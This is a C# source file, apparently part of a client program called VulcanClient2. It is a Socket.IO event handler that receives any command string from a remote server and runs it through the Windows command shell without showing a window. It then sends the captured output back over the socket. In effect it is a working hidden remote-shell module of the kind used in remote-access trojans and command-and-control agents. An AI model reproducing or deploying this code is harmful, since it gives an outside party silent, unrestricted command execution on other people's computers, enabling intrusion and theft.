using System;
using System.Threading.Tasks;
using SocketIOClient;
using System.Diagnostics;
using System.IO;
using System.Text;
using Serilog;

namespace VulcanClient2.Events
{
    public class CommandEvent : Event
    {
        public CommandEvent(SocketIO socket, string name) : base(socket, name) {}

        public override async Task Run(SocketIOResponse response)
        {
            string cmd = "/C " + response.GetValue<string>();

            var process = new Process();
            process.StartInfo.FileName = "cmd";
            process.StartInfo.Arguments = cmd;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.StandardErrorEncoding = Encoding.UTF8;
            process.StartInfo.StandardOutputEncoding = Encoding.UTF8;

            process.Start();

            Log.Information($"Wyslano komende {cmd}");

            await process.WaitForExitAsync();

            StreamReader reader = process.StandardOutput;
            StreamReader errorReader = process.StandardError;

            string cmdOutput = reader.ReadToEnd();
            string cmdError = errorReader.ReadToEnd();

            string output = cmdError != "" ? cmdError : cmdOutput;

            Log.Debug(output);
            await Socket.EmitAsync("command", new
            {
                message = output
            });
        }
    }
}